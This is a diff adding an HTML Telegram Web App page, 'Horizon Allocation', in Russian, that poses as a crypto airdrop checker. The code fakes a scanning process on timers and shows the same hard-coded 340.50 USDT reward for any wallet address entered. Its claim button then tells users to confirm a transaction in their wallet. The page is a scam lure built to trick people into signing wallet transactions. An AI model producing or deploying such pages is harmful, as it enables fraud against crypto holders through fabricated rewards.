@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Horizon Allocation</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0b0e14;
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background: linear-gradient(145deg, #131924, #1a2233);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            border: 1px solid #243147;
+            box-sizing: border-box;
+        }
+
+        .logo-container {
+            margin-bottom: 20px;
+        }
+
+        .logo-globe {
+            width: 80px;
+            height: 80px;
+            background: radial-gradient(circle, #00ffcc 0%, transparent 70%);
+            border-radius: 50%;
+            display: inline-block;
+            animation: pulse 2s infinite alternate;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); opacity: 0.6; }
+            100% { transform: scale(1.05); opacity: 1; }
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        p {
+            color: #8492a6;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            color: #00ffcc;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            background-color: #0b0e14;
+            border: 1px solid #243147;
+            border-radius: 10px;
+            padding: 12px 15px;
+            color: #ffffff;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #00ffcc;
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.2);
+        }
+
+        .btn {
+            width: 100%;
+            background: linear-gradient(90deg, #00ffcc, #0099ff);
+            border: none;
+            border-radius: 10px;
+            padding: 14px;
+            color: #0b0e14;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 255, 204, 0.3);
+        }
+
+        #status-loader {
+            display: none;
+            margin: 20px auto 10px auto;
+            border: 4px solid #1a2233;
+            border-top: 4px solid #00ffcc;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        #status-text {
+            display: none;
+            font-size: 14px;
+            color: #8492a6;
+            margin-top: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo-globe"></div>
+        </div>
+        
+        <h1>Horizon Allocation</h1>
+        <p>Проверьте историю ончейн-активности вашего адреса для автоматического расчёта доступных наград.</p>
+
+        <div id="form-content">
+            <div class="input-group">
+                <label for="wallet-input">Адрес кошелька</label>
+                <input type="text" id="wallet-input" placeholder="Введите TON, SOL, BSC или ARB адрес..." autocomplete="off">
+            </div>
+            <button type="button" class="btn" onclick="checkBalance()">Проверить баланс</button>
+        </div>
+
+        <div id="status-loader"></div>
+        <div id="status-text"></div>
+    </div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        function checkBalance() {
+            const walletInput = document.getElementById('wallet-input').value.trim();
+            const statusLoader = document.getElementById('status-loader');
+            const statusText = document.getElementById('status-text');
+            const formContent = document.getElementById('form-content');
+
+            if (walletInput === "") {
+                alert("Пожалуйста, введите адрес кошелька!");
+                return;
+            }
+
+            // Прячем ввод, включаем анимацию
+            formContent.style.display = "none";
+            statusLoader.style.display = "block";
+            statusText.style.display = "block";
+            statusText.innerText = "Проверка истории транзакций...";
+
+            setTimeout(() => {
+                statusText.innerText = "Сканирование смарт-контрактов...";
+                
+                setTimeout(() => {
+                    statusLoader.style.display = "none";
+                    
+                    // Вот она — генерация интерфейса с кнопкой «Забрать AirDrop»
+                    statusText.innerHTML = `
+                        <span style="color: #00ffcc; font-size: 18px; font-weight: bold;">
+                            🎉 Найдена доступная аллокация!
+                        </span><br>
+                        <span style="font-size: 28px; color: #fff; font-weight: 800; display: inline-block; margin: 15px 0; letter-spacing: 1px;">
+                            340.50 USDT
+                        </span><br>
+                        <button class="btn" onclick="claimAirdrop()">Забрать AirDrop</button>
+                    `;
+                }, 1500);
+            }, 1500);
+        }
+
+        function claimAirdrop() {
+            alert("Для получения аллокации подтвердите транзакцию в вашем кошельке!");
+            tg.close();
+        }
+    </script>
+</body>
+</html>
